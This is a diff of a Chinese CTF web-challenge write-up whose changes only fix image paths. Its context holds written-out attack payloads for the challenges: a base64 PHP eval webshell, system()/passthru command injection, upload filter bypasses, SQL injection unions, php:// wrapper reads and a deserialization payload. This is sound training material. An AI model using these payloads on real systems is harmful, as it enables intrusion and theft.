@@ -25,7 +25,7 @@
 
 使用F12后发现加载一张图片时出错：
 
-![12](../Picture/2.png)
+![12](Picture/2.png)
 
 ```python
 #解决方法：使用flask框架的模板注入
@@ -72,7 +72,7 @@ payload的构造过程：
 
 初始界面只有一行字符串，提示传入一个值，因此尝试在原URL后添加?a=1，显示出PHP代码。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\60.png)
+![12](Picture/60.png)
 
 代码的大致意思是，传入的参数不能含有flag或者/flag，不能含有Linux常用命令比如system、readfile、gz、exec、eval、cat、assert、file、fgets等。代码中提到的template.html暗示了本道题目需要用到模板注入。下面先做知识点的引入：
 
@@ -90,7 +90,7 @@ passthru()函数：执行外部程序并且显示原始输出。例：{if passth
 
 因此，本题采用的方式就是使用passthru函数，显示当前目录。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\61.png)
+![12](Picture/61.png)
 
 发现当前目录下有一个_26988文件，使用more命令查看：`http://114.67.175.224:15818?a={if passthru("more /_12016 ")}{/if}`，可以获得flag的值。
 
@@ -102,7 +102,7 @@ passthru()函数：执行外部程序并且显示原始输出。例：{if passth
 
 F12查看源码：
 
-![12](Picture\3.png)
+![12](Picture/3.png)
 
 ```python
 #解决方法
@@ -117,11 +117,11 @@ os.system('cat /flag')     #表示查看本目录下的flag
 
 初始页面是一些二手商品的信息，和淘宝类似，首先需要注册账号并登录成功，接着寻找上传头像的地方有注入点，原因：上传空图片点击确定会卡死。随便传入一张图片后用burp抓包。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\62.png)
+![12](Picture/62.png)
 
 可以发现image是经过base64加密的，因此可以使用base64一句话木马进行注入。`image=data:image/php;base64,<?php @eval($_POST[flag]);?`：前半句话表示以php形式传输图片，后半句话表示**base64一句话木马**，此时需要将该木马转成baset64编码进行传输。即：`data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2ZsYWddKTs/Pg==`
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\63.png)
+![12](Picture/63.png)
 
 重放请求后收到php文件存放的路径，此时需要用中国蚁剑进行连接
 
@@ -130,15 +130,15 @@ os.system('cat /flag')     #表示查看本目录下的flag
 
 连接成功后在html文件夹下找到flag文件获取flag值
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\65.png)
+![12](Picture/65.png)
 
 **例3：[文件上传---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\69.png)
+![12](Picture/69.png)
 
 初始界面要求上传一个非php文件，传入1.jpg(文件内容为一句话PHP木马)试试，使用burp抓包可以看到：
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\70.png)
+![12](Picture/70.png)
 
 红圈圈起来的部分就是可以修改的部分。
 
@@ -146,7 +146,7 @@ os.system('cat /flag')     #表示查看本目录下的flag
 - 第二点，限制php文件上传，不代表php4、php5等被进制，将文件名改成1.php4
 - 第三点，Content-Type改为image/jpg。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\71.png)
+![12](Picture/71.png)
 
 此时服务器响应php文件存储的路径，用蚂剑连接，后续过程和上题一致。
 
@@ -154,7 +154,7 @@ os.system('cat /flag')     #表示查看本目录下的flag
 
 初始界面就一行文字，啥也没有，通过F12也没看到啥信息，通过dirsearch扫描敏感目录时获得/upload.php目录，进入发现一个文件上传页面。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\72.png)
+![12](Picture/72.png)
 
 和上题一样，只能传一张图片，可以在图片中写入PHP木马，不过本题采用另一种手段注入木马，通过**script方式**。此外，蚁剑连接一般需要通过php方式连接，像上题中一样，需要将图片的后缀改成.php。而用script方式可以不用改后缀，**直接连接.jpg文件。**
 
@@ -162,7 +162,7 @@ os.system('cat /flag')     #表示查看本目录下的flag
 
 通过burp repeater 发送请求后，收到响应 upload/202203091220116781.jpg。此时用蚁剑连接。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\73.png)
+![12](Picture/73.png)
 
 连接后查看根路径下的flag文件，获取flag值。
 
@@ -184,7 +184,7 @@ os.system('cat /flag')     #表示查看本目录下的flag
 
 F12查看源码：
 
-![12](Picture\4.png)
+![12](Picture/4.png)
 
 ```python
 #解决方法
@@ -196,11 +196,11 @@ F12查看源码：
 
 **例2：[备份是个好习惯--bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\45.png)
+![12](Picture/45.png)
 
 F12后发现一串字符串，第一个想法是会不会Base64加密了，不过一般Base64加密后的字符串的最后有“==”。接着就考虑用dirsearch或者御剑扫描一下敏感目录，下图为dirsearch扫描的结果。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\46.png)
+![12](Picture/46.png)
 
 可以发现其中的index.php.bak备份文件。下载下来后用txt方式打开，发现是PHP源代码。
 
@@ -251,7 +251,7 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
 
 初始页面自动跳转到hello.php，F12后可以发现一行注释<!--1p.html-->
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\54.png)
+![12](Picture/54.png)
 
 **掌握直接读取源码的方法**：在http:IP+端口号之前加上`view-source:`，代码如下：
 
@@ -322,13 +322,13 @@ post传入：bugku is a nice plateform!
 
 最终的payload 
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\55.png)
+![12](Picture/55.png)
 
 **例4：[前女友---bugku]：**
 
 初始界面就一段文字，扫描敏感文件也没扫到，只能用Burp抓包看看。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\66.png)
+![12](Picture/66.png)
 
 发现居然由两个字超链接到code.txt文件，打开文件发现是一串PHP代码。
 
@@ -355,11 +355,11 @@ if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
 
 **例1：[alert---bugku]：**
 
-![12](Picture\5.png)
+![12](Picture/5.png)
 
 Ctrl + S 保存网页到本地，用记事本打开。
 
-![12](Picture\6.png)
+![12](Picture/6.png)
 
 ```python
 #解决方法
@@ -367,7 +367,7 @@ Ctrl + S 保存网页到本地，用记事本打开。
 #如下图所示
 ```
 
-![12](Picture\7.png)
+![12](Picture/7.png)
 
 
 
@@ -377,7 +377,7 @@ Ctrl + S 保存网页到本地，用记事本打开。
 
 用抓包软件或者F12中的网络可以发现游戏失败后出现了一个php文件
 
-![12](Picture\8.png)
+![12](Picture/8.png)
 
 ```python
 #PHP URL
@@ -463,11 +463,11 @@ eval($_POST[ymlisisisiook]);
 
 使用disable_functions绕过插件。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\81.png)
+![12](Picture/81.png)
 
 然后在文件目录下建立了一个.antproxy.php的文件。使用蚁剑连接该文件(IP地址+文件名)，密码和之前一致。连接后就能使用命令查看flag的值了。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\82.png)
+![12](Picture/82.png)
 
 
 
@@ -475,19 +475,19 @@ eval($_POST[ymlisisisiook]);
 
 **例1：[网站被黑---bugku]：**
 
-![12](Picture\9.png)
+![12](Picture/9.png)
 
 F12没有发现什么问题，通过**御剑**扫描网站敏感目录
 
-![12](Picture\10.png)
+![12](Picture/10.png)
 
 发现其中有两个PHP文件，index.php指向网站本身，shell.php为一个登录页面。
 
-![12](Picture\11.png)
+![12](Picture/11.png)
 
 此时需要获取密码。通过burp suite爆破方式获取。
 
-![12](Picture\12.png)
+![12](Picture/12.png)
 
 Length和其他不同的即为密码，密码为hack。
 
@@ -499,7 +499,7 @@ Length和其他不同的即为密码，密码为hack。
 
 **例1：[eval---bugku]：**
 
-![12](Picture\13.png)
+![12](Picture/13.png)
 
 ```python
 #分析代码
@@ -512,11 +512,11 @@ http://114.67.175.224:16339?hello=system("cat flag.php")
 #显示结果如下图，注意flag的值没有直接显示，那么就F12查看，发现在注释中。
 ```
 
-![12](Picture\14.png)
+![12](Picture/14.png)
 
 **例2：[变量1---bugku]：**
 
-<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\24.png" alt="12" style="zoom:150%;" />
+<img src="Picture/24.png" alt="12" style="zoom:150%;" />
 
 首先分析PHP代码：
 
@@ -531,7 +531,7 @@ var_dump() #表示输出字符串的类型
 
 解决思路：题目中给了提示：变量，因此flag的值可能隐藏在args值的类型中，而eval能执行PHP代码，需要用到**超全局变量**$GLOBES：用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\25.png)
+![12](Picture/25.png)
 
 **例3：[No one knows regex better than me---bugku]：**
 
@@ -575,7 +575,7 @@ else{
 - $third = $first ，且要匹配`|.php`，$end = substr($third,5) => $first/$third = `xxxx|.php`，其中x得满足`Yeedo|wants|a|girl|friend|or|a`
 - 因此完整的payload为`?zero=ZmxhZw==&first=aaaa|.php`
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\51.png)
+![12](Picture/51.png)
 
 **例4：[闪电十六鞭---bugku]：**
 
@@ -640,7 +640,7 @@ else{
 
 **例1：[cookies---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\52.png)
+![12](Picture/52.png)
 
 
 
@@ -701,11 +701,11 @@ echo $fa[$line];
 
 可以看到需要设置cookie的值为margin=margin，此时可以访问keys.php文件，将keys.php用base64加密后得到`a2V5cy5waHA=`，修改GET请求后重新发出。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\53.png)
+![12](Picture/53.png)
 
 **例2：[秋名山车神---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\57.png)
+![12](Picture/57.png)
 
 初始界面要求两秒内计算出长表达式结果并提交，不断的刷新，发现表达式一直在变换，这种必须写脚本，才能跟上速度。
 
@@ -729,11 +729,11 @@ print(r.text)
 - string : 要被查找替换的原始字符串。
 - flags : 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\58.png)
+![12](Picture/58.png)
 
 **例3：[速度要快---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\59.png)
+![12](Picture/59.png)
 
 初始界面可以发现flag值在response中的Header中，很明显是Base64加密后的形式，不过需要注意的是每次刷新页面，flag的值会动态改变。因此需要编写脚本代替手动post。
 
@@ -764,7 +764,7 @@ print((r.post('http://114.67.175.224:12562/',data=data)).text)
 
 **例1：[bp---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\20.png)
+![12](Picture/20.png)
 
 首先用bp抓包，然后将Post请求发到Intruder进行爆破。
 
@@ -776,17 +776,17 @@ print((r.post('http://114.67.175.224:12562/',data=data)).text)
 #设置options中的Grep-Match，如下图所示。
 ```
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\21.png)
+![12](Picture/21.png)
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\22.png)
+![12](Picture/22.png)
 
 再次进行爆破，爆破结果如下，可以很容易找到password。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\23.png)
+![12](Picture/23.png)
 
 **例2：[本地管理员---bugku]：**
 
-![12](Picture\17.png)
+![12](Picture/17.png)
 
 这题考察的是**限制登录IP**的情形。从F12中可以看到注释里含有Base64加密的字符dGVzdDEyMw== ，利用Burp的Decoder功能进行解密，解密结果为test123。猜测为管理员系统的密码。
 
@@ -800,21 +800,21 @@ X-Forwarded-For: 127.0.0.1
 
 然后通过Intruder对用户名进行爆破：
 
-![12](Picture\18.png)
+![12](Picture/18.png)
 
 可以得到管理员的用户名和密码分别为admin和test123。
 
 最后通过Repeater界面重放Post请求，收到带有flag值的Response。
 
-![12](Picture\19.png)
+![12](Picture/19.png)
 
 **例3：[好像需要密码---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\36.png)
+![12](Picture/36.png)
 
 题目中的提示是5位的数字密码，可以使用bp的密码爆破，设置从10000~99999，步长为1的所有数字进行爆破。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\37.png)
+![12](Picture/37.png)
 
 这种方法得到爆破密码比较慢，另一种方法是编写python脚本：
 
@@ -860,7 +860,7 @@ print('执行完毕！')
 
 执行结果如下：
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\39.png)
+![12](Picture/39.png)
 
 **例4：[基础认证---ctfhub]：**
 
@@ -890,33 +890,33 @@ Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==  #base64加密，解密后为A
 
 **例1：[source---bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\30.png)
+![12](Picture/30.png)
 
 F12发现，注释中的flag为虚假的值，接着题目中的提示为Linux，想到使用Linux中的dirsearch命令进行目录扫描
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\26.png)
+![12](Picture/26.png)
 
 扫描后可以发现一个flag.txt文件，发现flag仍为虚假的值，不要灰心。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\27.png)
+![12](Picture/27.png)
 
 接着使用wegt -r http://ip_address/.git 进行递归，在其爆出的文件夹中进行git reflog查看执行的命令日志。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\28.png)
+![12](Picture/28.png)
 
 然后通过左边的文件代号，通过git show + 文件代号的方式即可查看到最终的flag值。cu
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\29.png)
+![12](Picture/29.png)
 
 **例2：[git---ctfhub]：**
 
 题目中给出的提示是git泄露，通过 curl + IP地址 + .git/config 可以发现确实出现了git泄露，接着使用Githack 工具clone源代码到本地。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\85.png)
+![12](Picture/85.png)
 
 然后进入文件夹，使用命令 `git log` 查看历史记录。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\86.png)
+![12](Picture/86.png)
 
 可以看到一次添加flag，一次移除flag，我们主要关注这个添加flag的版本。
 
@@ -928,7 +928,7 @@ SVN泄露也属于信息泄露的一种，通过dirsearch扫描发现有.svn/目
 
 用法：perl rip-svn.pl -u IP/.svn
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\87.png)
+![12](Picture/87.png)
 
 接着进入 `.svn/pristine/`目录，可以找到flag。
 
@@ -938,7 +938,7 @@ HG泄露也属于信息泄露的一种，通过dirsearch扫描发现有.hg/目�
 
 用法：perl rip-hg.pl -u IP/.hg
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\88.png)
+![12](Picture/88.png)
 
 接着进入`.hg/store/fncache`可以看到flag的文件名`flag_2420924647.txt`，访问即可得到flag。
 
@@ -950,7 +950,7 @@ HG泄露也属于信息泄露的一种，通过dirsearch扫描发现有.hg/目�
 
 **例1：[源代码---bugku]：**
 
-<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\31.png" alt="12" style="zoom:150%;" />
+<img src="Picture/31.png" alt="12" style="zoom:150%;" />
 
 F12查看后发现其中隐藏了script脚本代码，其中包含了大量%的文本，猜测是URL编码后的字符串。
 
@@ -964,7 +964,7 @@ eval(unescape(p1) + unescape("54aa2") + p2)
 67d709b2b54aa2aa648cf6e87a7114f1
 ```
 
-<img src="E:\Study\渗透分析和漏洞测试\CTF题解\Picture\32.png" alt="12" style="zoom:100%;" />
+<img src="Picture/32.png" alt="12" style="zoom:100%;" />
 
 **例2：[反射型---ctfhub]：**
 
@@ -978,11 +978,11 @@ eval(unescape(p1) + unescape("54aa2") + p2)
 
 接着将其进行URL编码后，拼接上页面的URL，在第二个表单进行提交。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\91.png)
+![12](Picture/91.png)
 
 然后在xss平台可以获得 cookie 信息，里面包含 flag 值。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\92.png)
+![12](Picture/92.png)
 
 
 
@@ -990,17 +990,17 @@ eval(unescape(p1) + unescape("54aa2") + p2)
 
 **例1：[文件包含--bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\33.png)
+![12](Picture/33.png)
 
 F12后可以看到一个a标签，跳转的内容为`./index.php?file=show.php`，可以联想到文件包含漏洞：用户可以控制包含的文件名，从而导致信息泄露和getshell。
 
 一般的解决方法是**利用封装协议(伪协议)读源码**：`?file=php://filter/read=convert.base64-encode/resource=index.php`，查看php文件的源码。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\34.png)
+![12](Picture/34.png)
 
 得到一串Base64加密后的php源码，解密后在注释中找到flag。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\35.png)
+![12](Picture/35.png)
 
 **例2：[file_get_contents--bugku]：**
 
@@ -1028,7 +1028,7 @@ echo "<p>sorry!</p>";
 
 可以构造payload为?ac=1&fn=php://input
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\68.png)
+![12](Picture/68.png)
 
 
 
@@ -1042,7 +1042,7 @@ echo "<p>sorry!</p>";
 
 `id=a' union select 1,2,3,database()#`：id=a'的目的是闭合前一个查询，并使其无效。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\50.png)
+![12](Picture/50.png)
 
 数据库名为skctf，接着查询表名：`id=a' union select 1,2,3,concat(table_name) from information_schema.tables where table_schema='skctf'#`，表名为fl4g。
 
@@ -1052,7 +1052,7 @@ echo "<p>sorry!</p>";
 
 **例2：[login1--bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\67.png)
+![12](Picture/67.png)
 
 首先随便注册一个账号并登录成功后，页面显示管理员身份登录才能看到flag的值。结合题目中的提示SQL约束攻击，可以猜测管理员的用户名。
 
@@ -1072,11 +1072,11 @@ if (!empty($row) && $row['password']===md5($password)){
 
 分析代码，大致含义是要求SQL注入绕过username，然后输入的password的值要和md5加密后的一致。因此采用联合查询的方式。payload：username=admin' union select 1,md5(123)#&password=123。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\77.png)
+![12](Picture/77.png)
 
 可以看到成功绕过了前端登录页面，进入了后台。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\78.png)
+![12](Picture/78.png)
 
 接着输入命令想要获取更多的信息，发现很多命令都被过滤了。
 
@@ -1240,7 +1240,7 @@ if(isset($_POST['username']) && isset($_POST['password'])){
 
 接下来，先用非admin用户登录，并用burp抓包看看效果。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\79.png)
+![12](Picture/79.png)
 
 知识点：
 
@@ -1294,7 +1294,7 @@ print ("反转后的cipher：" + xor_cipher)
 
 得到翻转后的cipher值后修改post请求，将cipher的值和iv的值放置在cookie中。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\80.png)
+![12](Picture/80.png)
 
 Base64解密后发现username已经等于admin了，但是前面有一段乱码，原因：我们修改zdmin为admin的时，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。
 
@@ -1325,7 +1325,7 @@ print urllib.quote(base64.b64encode(newIv))
 
 首先要想到system函数，通过构造`?s=system("ls")`调用ls命令查看当前路径。发现存放flag值的txt文件。查看内容即可得到flag的值。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\56.png)
+![12](Picture/56.png)
 
 
 
@@ -1581,7 +1581,7 @@ elseif (unserialize($cookie) === "$KEY")
 
 分析代码，发现需要在请求中设置Cookie，BUGKU参数的值要求等于$KEY值的序列化后的结果，借助PHP在线工具，获得序列化后的值
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\74.png)
+![12](Picture/74.png)
 
 此时，通过burp，重放请求，增加 Cookie: BUGKU=s:13:"ctf.bugku.com"; 即可得到flag值。
 
@@ -1679,7 +1679,7 @@ User类的触发：`O:4:"User":2:{s:8:"username";s:3:"123";s:8:"password";s:41:"
 
 `username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&password=a";s:8:"password";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}`
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\75.png)
+![12](Picture/75.png)
 
 得到一串Base64加密的字符串，解密后得到：
 
@@ -1691,7 +1691,7 @@ User类的触发：`O:4:"User":2:{s:8:"username";s:3:"123";s:8:"password";s:41:"
 
 此时需要用到之前学过的知识 view-source查看文件源码。方法：view-source:114.67.175.224:12230/index.cgi
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\76.png)
+![12](Picture/76.png)
 
 从url中可以看到get方法可以获取name，因此直接使用file伪协议，直接getflag。方法：
 
@@ -1718,7 +1718,7 @@ wget http://challenge-5e11a4163c058a15.sandbox.ctfhub.com:10080/.index.php.swp
 vim index.php
 ```
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\83.png)
+![12](Picture/83.png)
 
 然后选择 R 进行恢复，即可查看到源码。
 
@@ -1730,7 +1730,7 @@ vim index.php
 
 还有一种方式就是通过 Python-dsstore 工具 (https://github.com/gehaxelt/Python-dsstore)来完成 .DS_Store 文件的解析：
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\84.png)
+![12](Picture/84.png)
 
 
 
@@ -1738,46 +1738,46 @@ vim index.php
 
 **例1：[社工-初步收集--bugku]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\40.png)
+![12](Picture/40.png)
 
 首先扫描观察是否有敏感文件，使用kali中的dirsearch命令进行扫描。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\41.png)
+![12](Picture/41.png)
 
 可以看到扫描到一些php文件，进入/admin/index.php界面。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\42.png)
+![12](Picture/42.png)
 
 接下来需要获取账号和密码，首页中提供了一个辅助工具sz.zip下载，下载解压后是一个exe文件，通过IDA逆向分析，能力有限，目前还是做不到。于是尝试另一种方法：通过wireshark抓SMTP的包。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\43.png)
+![12](Picture/43.png)
 
 base64解密账号和密码，发现密码是邮箱授权码，登录foxmail邮箱(一直显示网络环境风险，登录不上，只能看别人WP了)。
 
 登录进去后发现全被删除了，其中一封邮件中获得了mara的发件人，通过safe6 社工爆破工具爆破出她的出生年为2001-02-06。因此，用户名为mara，密码为20010206。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\44.png)
+![12](Picture/44.png)
 
 **例2：[社工-伪造--bugku]：**
 
 初始界面是一个聊天室，需要用QQ号进行登录，随便输入1234567，进入聊天页面，发现只有一个用户在线。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\47.png)
+![12](Picture/47.png)
 
 点开小美右上角的空间，进一步获取其男朋友的信息。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\48.png)
+![12](Picture/48.png)
 
 发现QQ名称为小bug，联想到题目的要求是伪造，因此，将自己的QQ名称改为小bug，伪造成小美的男朋友，重新登录聊天室，发送flag信息。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\49.png)
+![12](Picture/49.png)
 
 **例3：[默认口令--ctfhub]：**
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\89.png)
+![12](Picture/89.png)
 
 初始界面如上图所示，一开始以为是用户名密码爆破的题目，但发现验证码每次都在变化，因此不能通过抓包进行爆破。从社工角度思考，观察这个界面是eYou邮件网关，可以联想到去搜索这个网关的默认账号密码。
 
-![12](E:\Study\渗透分析和漏洞测试\CTF题解\Picture\90.png)
+![12](Picture/90.png)
 
 此时通过这三个默认账号登录，即可找到flag值。
